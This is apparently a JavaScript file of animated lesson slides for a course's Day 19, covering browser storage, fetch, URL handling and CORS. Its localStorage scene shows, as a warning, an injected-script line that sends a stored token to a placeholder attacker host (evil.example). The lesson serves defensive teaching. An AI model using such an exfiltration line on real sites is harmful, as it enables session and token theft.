/* Day 19 in motion: where browser data lives (cookies, Web Storage, IndexedDB, Cache, OPFS), Web Storage pitfalls,
   fetch and Response semantics, URL/Headers/AbortController, origins and CORS, preflights and credentials. Loaded on demand by assets/js/motion.js. */
(function () {
  function nd(K, s, x, y, o) {
    o = o || {}; var w = o.w || 100, h = o.h || 40;
    K.box(x - w / 2, y - h / 2, w, h, { stroke: o.stroke || K.P.acc, dash: o.dash, fill: o.fill, a: o.a, lw: o.lw });
    K.text(s, x, y + 1, { size: o.size || 19, mono: !!o.mono, weight: o.weight || 600, align: 'center', color: o.color || K.P.ink, a: o.a });
  }
  /* a labelled message arrow (sequence diagrams) */
  function msg(K, x1, x2, y, label, sub, c, p, a) {
    K.arrow(x1, y, x2, y, { p: p, color: c, lw: 2.5, a: a });
    var mx = (x1 + x2) / 2;
    K.text(label, mx, y - 18, { size: 18, mono: true, weight: 700, color: c, align: 'center', a: Math.min(a == null ? 1 : a, K.clamp(p * 2 - 0.6)) });
    if (sub) K.text(sub, mx, y + 20, { size: 16, mono: true, color: K.P.muted, align: 'center', a: Math.min(a == null ? 1 : a, K.clamp(p * 2 - 0.8)) });
  }

JSC.motion.define('day19', {
  kicker: 'JavaScript: Zero to Architect · Day 19',
  poster: 3,
  scenes: [

/* 1 ─ title */
{ d: 7, title: 'Welcome',
  caps: [[0.8, 'Day 19: where the browser keeps your data, and how requests travel, including CORS.']],
  draw: function (K, t) {
    var g = K.g, P = K.P, s = K.back((t - 0.2) / 0.9);
    g.save(); g.translate(640, 230); g.scale(0.6 + 0.4 * s, 0.6 + 0.4 * s);
    K.text('Storage and the network', 0, 0, { size: 78, weight: 800, align: 'center', a: K.clamp(t / 0.6) }); g.restore();
    K.text('Day 19 · Where data lives, how it travels', 640, 330, { size: 34, color: P.acc, align: 'center', a: K.p(t, 0.9, 0.7) });
    ['Browser storage', 'fetch', 'CORS'].forEach(function (c, i) {
      var q = K.back((t - 1.8 - i * 0.35) / 0.6);
      if (q > 0) K.chip(c, 380 + i * 260, 440, { s: q, a: K.clamp(q * 2), size: 21, stroke: P.acc });
    });
  } },

/* 2 ─ the storage map */
{ d: 26, title: 'Where data lives',
  caps: [
    [0.3, 'The browser offers several places to keep data. Cookies are small, about 4 KB, and ride along with every request.'],
    [7, 'localStorage and sessionStorage hold about 5 MiB of strings, synchronously. localStorage persists; sessionStorage is per tab.'],
    [13.5, 'IndexedDB, the Cache API and OPFS are asynchronous and large: structured data, responses and files.'],
    [19.5, 'Quotas are per origin, and data can be evicted under pressure. navigator.storage.persist() asks the browser to keep it.']],
  draw: function (K, t) {
    var P = K.P;
    var C = [['Cookies', '~4 KB each', 'sent with every request', P.warm, 0.6],
             ['localStorage', '~5 MiB per origin', 'sync · strings · persists', P.acc, 7.2],
             ['sessionStorage', '~5 MiB per origin', 'sync · strings · per tab', P.acc, 9],
             ['IndexedDB', 'large (quota)', 'async · objects · indexes', P.purple, 13.7],
             ['Cache API', 'large (quota)', 'Request → Response pairs', P.purple, 15],
             ['OPFS', 'large (quota)', 'private files for the origin', P.purple, 16.3]];
    C.forEach(function (c, i) {
      var x = 40 + (i % 3) * 410, y = 84 + Math.floor(i / 3) * 180, q = K.back((t - c[4]) / 0.5); if (q <= 0) return;
      var a = K.clamp(q);
      K.g.save(); K.g.translate(x + 190, y + 75); K.g.scale(q, q); K.g.translate(-x - 190, -y - 75);
      K.box(x, y, 380, 150, { stroke: c[3], a: a });
      K.text(c[0], x + 20, y + 32, { size: 24, weight: 700, mono: true, color: c[3], a: a });
      K.text(c[1], x + 20, y + 76, { size: 19, a: a });
      K.text(c[2], x + 20, y + 112, { size: 18, color: P.muted, a: a });
      K.g.restore();
    });
    /* cookie rides along */
    K.arrow(180, 116, 270, 116, { p: K.p(t, 2.8, 0.6), color: P.warm, lw: 2, head: 10 });
    K.text('server', 280, 116, { size: 17, color: P.warm, a: K.p(t, 3.3) });
    K.text('small · sync', 1232, 249, { size: 16, color: P.acc, align: 'right', a: K.p(t, 10.4) });
    K.text('large · async', 1232, 428, { size: 16, color: P.purple, align: 'right', a: K.p(t, 17) });
    var code = ['const { usage, quota } = await navigator.storage.estimate();', 'await navigator.storage.persist();   // please do not evict'];
    var cp = K.p(t, 19.7);
    K.panel(40, 446, 1200, 136, 'quota.js', { a: cp });
    K.code(code, 64, 488, { size: 20, lh: 1.6, n: K.typed(t, code, [19.9, 21.6], 44), t: t, a: cp });
  } },

/* 3 ─ Web Storage pitfalls */
{ d: 26, title: 'localStorage pitfalls',
  caps: [
    [0.3, 'Web Storage keeps only strings. A number comes back as a string; an object becomes "[object Object]".'],
    [7, 'So JSON.stringify on the way in, JSON.parse on the way out, inside try/catch: a full or blocked storage throws.'],
    [13.5, 'It is synchronous, so big reads block the main thread. The storage event fires in the other tabs, not the one that wrote.'],
    [19.5, 'Never keep tokens or secrets there: any script on the page, including injected XSS, can read it.']],
  draw: function (K, t) {
    var P = K.P, c1 = ['localStorage.setItem("n", 1);', 'localStorage.setItem("o", { a: 1 });', 'localStorage.getItem("n")  // "1"', 'localStorage.getItem("o")  // "[object Object]"'];
    K.panel(40, 84, 580, 170, 'storage.js', { a: K.p(t, 0.2) });
    K.code(c1, 64, 118, { size: 18, lh: 1.55, n: K.typed(t, c1, [0.5, 1.6, 3, 4.6], 40), t: t, a: K.p(t, 0.2), w: 550,
      marks: t > 5.8 ? { 3: 'rgba(252,129,129,.16)' } : null });
    var c2 = ['const save = (k, v) => {', '  try { localStorage.setItem(k, JSON.stringify(v)); }', '  catch (e) { return false; }   // full or blocked', '};',
      'const load = (k) => JSON.parse(localStorage.getItem(k));'];
    var cp = K.p(t, 7.2);
    K.panel(650, 84, 590, 170, 'store.js', { a: cp, stroke: P.green });
    K.code(c2, 672, 112, { size: 17, lh: 1.5, n: K.typed(t, c2, [7.4, 8.4, 10, 11.2, 11.4], 46), t: t, a: cp });
    /* tabs and the storage event */
    var tb = K.p(t, 13.7);
    K.text('storage event', 40, 290, { size: 18, weight: 700, color: P.blue, a: tb });
    nd(K, 'Tab A writes', 130, 350, { w: 170, h: 46, a: tb, stroke: P.blue, size: 17 });
    nd(K, 'Tab B', 450, 330, { w: 120, h: 40, a: K.p(t, 14.4), size: 17 });
    nd(K, 'Tab C', 450, 392, { w: 120, h: 40, a: K.p(t, 14.4), size: 17 });
    K.arrow(220, 344, 384, 330, { p: K.p(t, 14.8, 0.5), color: P.blue, lw: 2 });
    K.arrow(220, 358, 384, 392, { p: K.p(t, 14.8, 0.5), color: P.blue, lw: 2 });
    K.mark(530, 330, true, 0.7, K.p(t, 15.4)); K.mark(530, 392, true, 0.7, K.p(t, 15.4));
    K.text('no event in Tab A itself', 60, 412, { size: 16, color: P.muted, a: K.p(t, 16.2) });
    K.chip('synchronous: big values block the main thread', 300, 470, { size: 17, stroke: P.warm, a: K.p(t, 17.4) });
    /* XSS reads it */
    var x = K.p(t, 19.7);
    K.box(650, 280, 590, 214, { fill: 'rgba(252,129,129,.08)', stroke: P.red, a: x });
    K.text('injected script', 674, 312, { size: 18, weight: 700, color: P.red, a: x });
    K.code(['fetch("https://evil.example/?t=" +', '  localStorage.getItem("token"));'], 674, 340, { size: 18, n: K.typed(t, ['fetch("https://evil.example/?t=" +', '  localStorage.getItem("token"));'], [20, 21.2], 40), t: t, a: x });
    K.mark(674, 452, false, 0.7, K.p(t, 22.2)); K.text('the token is gone', 698, 452, { size: 18, color: P.red, a: K.p(t, 22.2) });
    K.chip('sessions: HttpOnly cookie, unreadable by scripts', 945, 548, { size: 17, stroke: P.green, color: P.green, a: K.p(t, 23) });
  } },

/* 4 ─ fetch and Response */
{ d: 26, title: 'fetch and the Response',
  caps: [
    [0.3, 'fetch returns a promise of a Response. It rejects only when the network fails, or the request is aborted or blocked.'],
    [7, 'A 404 or a 500 still resolves. So always check response.ok before using the data.'],
    [13, 'The body is a one-shot stream: json(), text() or blob() can read it once. Clone the response to read it twice.'],
    [19.5, 'Wrap it in one small helper: a timeout with AbortSignal.timeout, and a throw on HTTP errors.']],
  draw: function (K, t) {
    var P = K.P;
    nd(K, 'fetch(url)', 120, 180, { w: 160, h: 50, mono: true, a: K.p(t, 0.4) });
    var B = [['network down', 'rejects: TypeError', 110, P.red, 1.4], ['404 Not Found', 'resolves · ok: false', 180, P.warm, 7.2], ['200 OK', 'resolves · ok: true', 250, P.green, 9]];
    B.forEach(function (b) {
      var a = K.p(t, b[4]);
      K.curve(202, 180, 260, b[2], 330, b[2], { p: K.p(t, b[4], 0.5), color: b[3], lw: 2.5, head: 10 });
      K.text(b[0], 346, b[2], { size: 19, mono: true, a: a });
      K.arrow(560, b[2], 640, b[2], { p: K.p(t, b[4] + 0.4, 0.4), color: b[3], lw: 2, head: 10 });
      K.chip(b[1], 800, b[2], { size: 18, mono: true, stroke: b[3], color: b[3], a: K.p(t, b[4] + 0.6) });
    });
    K.text('only this one rejects', 1000, 110, { size: 16, color: P.red, a: K.p(t, 2.4) });
    K.text('check res.ok!', 1000, 180, { size: 17, weight: 700, color: P.warm, a: K.p(t, 10.4) });
    var body = ['const copy = res.clone();', 'await res.json();    // { a: 1 }', 'await res.json();    // TypeError: body used', 'await copy.text();   // \'{"a":1}\''];
    var bp = K.p(t, 13.2);
    K.panel(40, 306, 580, 186, 'body.js', { a: bp });
    K.code(body, 64, 346, { size: 18, lh: 1.6, n: K.typed(t, body, [13.4, 14.6, 15.8, 17.2], 40), t: t, a: bp, w: 540,
      marks: t > 16.8 ? { 2: 'rgba(252,129,129,.16)' } : null });
    K.chip('read once', 330, 540, { size: 18, stroke: P.warm, a: K.p(t, 16.6) });
    var hp = K.p(t, 19.7), help = ['async function getJson(url) {', '  const res = await fetch(url, {', '    signal: AbortSignal.timeout(8000),', '  });',
      '  if (!res.ok) throw new Error("HTTP " + res.status);', '  return res.json();', '}'];
    K.panel(660, 306, 580, 276, 'getJson.js', { a: hp, stroke: P.green });
    K.code(help, 684, 340, { size: 18, lh: 1.55, n: K.typed(t, help, [19.9, 20.6, 21.2, 22, 22.2, 23.4, 24], 46), t: t, a: hp });
  } },

/* 5 ─ URL, Headers, AbortController */
{ d: 21, title: 'Requests in pieces',
  caps: [
    [0.3, 'new URL parses an address for you: origin, pathname and searchParams, with correct encoding.'],
    [7, 'Headers are case-insensitive. A Request bundles the method, the headers and the body.'],
    [13.5, 'An AbortController cancels a request, for example when the user leaves the page. The fetch rejects with an AbortError.']],
  draw: function (K, t) {
    var P = K.P;
    var u = K.p(t, 0.4);
    var parts = [['https://api.example.com', P.acc, 'origin'], ['/search', P.purple, 'pathname'], ['?q=js&page=2', P.warm, 'search']];
    var x = 80;
    parts.forEach(function (p, i) {
      var w = K.text(p[0], x, 116, { size: 26, mono: true, color: p[1], a: u });
      var q = K.p(t, 1.4 + i * 0.8);
      K.box(x, 136, w, 4, { fill: p[1], r: 2, a: q });
      K.text(p[2], x + w / 2, 160, { size: 17, color: p[1], align: 'center', a: q });
      x += w;
    });
    var c1 = ['const url = new URL("https://api.example.com/search?q=js&page=2");', 'url.origin                  // "https://api.example.com"', 'url.searchParams.get("q")   // "js"'];
    K.panel(40, 194, 760, 136, '', { a: K.p(t, 3.4) });
    K.code(c1, 64, 212, { size: 18, lh: 1.6, n: K.typed(t, c1, [3.6, 5, 6], 50), t: t, a: K.p(t, 3.4) });
    var c2 = ['const h = new Headers({ "Content-Type": "application/json" });', 'h.get("content-type")       // "application/json"'];
    K.panel(40, 344, 760, 104, '', { a: K.p(t, 7.2) });
    K.code(c2, 64, 364, { size: 18, lh: 1.6, n: K.typed(t, c2, [7.4, 8.8], 50), t: t, a: K.p(t, 7.2) });
    var rq = K.p(t, 10);
    K.box(840, 194, 400, 254, { stroke: P.blue, a: rq });
    K.text('Request', 864, 224, { size: 22, weight: 700, color: P.blue, a: rq });
    [['method', 'POST'], ['url', '…/search'], ['headers', 'Content-Type'], ['body', '{"n":1}']].forEach(function (r, i) {
      var q = K.p(t, 10.4 + i * 0.5);
      K.text(r[0], 864, 276 + i * 42, { size: 18, color: P.muted, a: q });
      K.text(r[1], 980, 276 + i * 42, { size: 18, mono: true, a: q });
    });
    var c3 = ['const ctrl = new AbortController();', 'fetch(url, { signal: ctrl.signal });', 'ctrl.abort();   // the fetch rejects: AbortError'];
    var ap = K.p(t, 13.7);
    K.panel(40, 468, 760, 116, 'cancel.js', { a: ap });
    K.code(c3, 64, 496, { size: 18, lh: 1.45, n: K.typed(t, c3, [13.9, 15, 16.3], 46), t: t, a: ap });
    K.mark(880, 526, false, 0.8, K.p(t, 17.6)); K.text('request cancelled', 906, 526, { size: 19, color: P.red, a: K.p(t, 17.6) });
  } },

/* 6 ─ origins and CORS */
{ d: 28, title: 'Origins and CORS',
  caps: [
    [0.3, 'An origin is scheme plus host plus port. By default a page cannot read responses from another origin: the same-origin policy.'],
    [7.5, 'CORS lets a server relax that. The browser sends an Origin header; the server answers with Access-Control-Allow-Origin.'],
    [14, 'Without that header the browser hides the response from your code. But the server still received and handled the request.'],
    [20.5, 'CORS is enforced only by browsers; curl and servers ignore it. The fix is on the server, never mode "no-cors".']],
  draw: function (K, t) {
    var P = K.P, a = K.p(t, 0.4);
    var x = 60;
    [['https://', P.blue, 'scheme'], ['app.example.com', P.acc, 'host'], [':443', P.warm, 'port']].forEach(function (p, i) {
      var w = K.text(p[0], x, 110, { size: 26, mono: true, color: p[1], a: a });
      K.text(p[2], x + w / 2, 148, { size: 17, color: p[1], align: 'center', a: K.p(t, 1 + i * 0.5) });
      x += w;
    });
    [['https://app.example.com/page', true, ''], ['http://app.example.com', false, 'scheme'], ['https://api.example.com', false, 'host'], ['https://app.example.com:8080', false, 'port']].forEach(function (r, i) {
      var q = K.p(t, 2.6 + i * 0.7), y = 96 + i * 36;
      K.mark(700, y, r[1], 0.65, q);
      K.text(r[0], 722, y, { size: 17, mono: true, a: q });
      if (r[2]) K.text(r[2] + ' differs', 1240, y, { size: 16, color: P.red, align: 'right', a: q });
      else K.text('same origin', 1240, y, { size: 16, color: P.green, align: 'right', a: q });
    });
    /* browser and server */
    var bs = K.p(t, 7.6), blk = K.p(t, 14.2);
    K.box(40, 260, 290, 240, { stroke: P.acc, a: bs });
    K.text('Browser', 62, 290, { size: 21, weight: 700, a: bs });
    K.text('page: app.example.com', 62, 326, { size: 16, mono: true, color: P.muted, a: bs });
    nd(K, 'your JS', 185, 430, { w: 140, h: 48, a: bs, stroke: blk > 0.5 ? P.red : P.green });
    K.box(950, 260, 290, 240, { stroke: P.purple, a: bs });
    K.text('api.other.com', 972, 290, { size: 21, weight: 700, mono: true, a: bs });
    msg(K, 340, 940, 360, 'GET /data', 'Origin: https://app.example.com', P.blue, K.p(t, 8.2, 0.7), bs);
    msg(K, 940, 340, 440, 'Access-Control-Allow-Origin', 'https://app.example.com', P.green, K.p(t, 10.4, 0.7), bs * (1 - blk));
    msg(K, 940, 340, 440, '200 OK, no CORS header', 'blocked by the browser', P.red, K.p(t, 14.4, 0.7), blk);
    K.box(352, 412, 6, 60, { fill: P.red, r: 3, a: K.p(t, 15) });
    K.mark(250, 430, blk < 0.5, 0.7, K.p(t, 11.4));
    K.text('request handled ✓', 972, 340, { size: 17, color: P.warm, a: K.p(t, 16.6) });
    K.text('(it still ran!)', 972, 370, { size: 16, color: P.muted, a: K.p(t, 17.2) });
    /* the fix */
    var f = K.p(t, 20.7);
    K.text('curl, Node, servers: no CORS checks', 640, 512, { size: 18, align: 'center', color: P.muted, a: f });
    K.chip('fix: send the right headers from the server', 640, 556, { size: 18, stroke: P.green, color: P.green, a: K.p(t, 22) });
    K.text('mode: "no-cors" → opaque, unreadable', 1240, 556, { size: 16, mono: true, color: P.red, align: 'right', a: K.p(t, 23) });
  } },

/* 7 ─ preflight and credentials */
{ d: 27, title: 'Preflight and credentials',
  caps: [
    [0.3, 'Simple requests, GET, HEAD or POST with plain form or text content and safelisted headers, go straight through.'],
    [6.5, 'Anything else, a JSON content type, a custom header, PUT or DELETE, first gets a preflight: an OPTIONS request asking "may I?".'],
    [13.5, 'The server answers with the allowed methods and headers. Only then does the browser send the real request.'],
    [19.5, 'With cookies, credentials: "include" needs an explicit origin, not *, plus Allow-Credentials: true. Add Vary: Origin.']],
  draw: function (K, t) {
    var P = K.P;
    K.text('simple', 40, 100, { size: 20, weight: 700, color: P.green, a: K.p(t, 0.4) });
    ['GET · HEAD · POST', 'text/plain · form data', 'safelisted headers'].forEach(function (s, i) {
      var q = K.p(t, 0.8 + i * 0.6); K.mark(56, 140 + i * 40, true, 0.6, q); K.text(s, 78, 140 + i * 40, { size: 18, mono: true, a: q });
    });
    K.text('preflighted', 40, 284, { size: 20, weight: 700, color: P.warm, a: K.p(t, 6.6) });
    ['Content-Type: application/json', 'Authorization, X-Custom', 'PUT · PATCH · DELETE'].forEach(function (s, i) {
      var q = K.p(t, 7.4 + i * 0.7); K.text('•', 52, 324 + i * 40, { size: 20, color: P.warm, a: q }); K.text(s, 72, 324 + i * 40, { size: 17, mono: true, a: q });
    });
    /* sequence */
    var sq = K.p(t, 9);
    K.text('Browser', 600, 100, { size: 20, weight: 700, align: 'center', a: sq });
    K.text('Server', 1160, 100, { size: 20, weight: 700, align: 'center', a: sq });
    K.box(598, 118, 4, 340, { fill: P.line, r: 2, a: sq }); K.box(1158, 118, 4, 340, { fill: P.line, r: 2, a: sq });
    msg(K, 606, 1154, 170, 'OPTIONS /items', 'Request-Method: PUT', P.warm, K.p(t, 9.6, 0.8));
    msg(K, 1154, 606, 250, '204  Allow-Methods: PUT', 'Allow-Headers: content-type', P.green, K.p(t, 13.7, 0.8));
    msg(K, 606, 1154, 330, 'PUT /items  {JSON}', '', P.blue, K.p(t, 15.6, 0.8));
    msg(K, 1154, 606, 410, '200  Allow-Origin: …', 'only now can JS read it', P.green, K.p(t, 17.2, 0.8));
    /* credentials */
    var cr = ['fetch(url, { credentials: "include" })', 'Access-Control-Allow-Origin: https://app.example.com', 'Access-Control-Allow-Credentials: true', 'Vary: Origin'];
    var cp = K.p(t, 19.7);
    K.panel(40, 466, 1200, 118, '', { a: cp, stroke: P.purple });
    K.code(cr.slice(0, 2), 64, 482, { size: 18, lh: 1.6, n: K.typed(t, cr.slice(0, 2), [19.9, 21], 50), t: t, a: cp });
    K.code(cr.slice(2), 720, 482, { size: 18, lh: 1.6, n: K.typed(t, cr.slice(2), [22.6, 23.6], 50), t: t, a: cp });
    K.text('not *', 640, 543, { size: 16, color: P.red, a: K.p(t, 22) });
  } },

/* 8 ─ recap */
{ d: 14, title: 'Recap',
  caps: [[0.5, 'Recap. Now open the Day 19 topics below and run every example yourself.']],
  draw: function (K, t) {
    var P = K.P;
    K.text('Recap', 640, 106, { size: 48, weight: 800, align: 'center', a: K.p(t, 0.2) });
    ['Cookies ride along; Web Storage is small, sync and strings only',
     'IndexedDB, Cache and OPFS: large and async',
     'No tokens in localStorage: any script can read it',
     'fetch rejects only on network errors: check res.ok',
     'CORS: the server decides who may read its responses',
     'Non-simple requests send an OPTIONS preflight first'].forEach(function (s, i) {
      var q = K.p(t, 1.2 + i * 1, 0.5), y = 172 + i * 60;
      K.mark(220, y, true, 0.9, q);
      K.text(s, 252 - (1 - q) * 20, y, { size: 24, a: q });
    });
    K.chip('Next: run the Day 19 examples with ▶ Run', 640, 545, { size: 22, stroke: P.acc, color: P.acc, s: K.back((t - 8) / 0.6), a: K.p(t, 8) });
  } }
  ]
});
})();
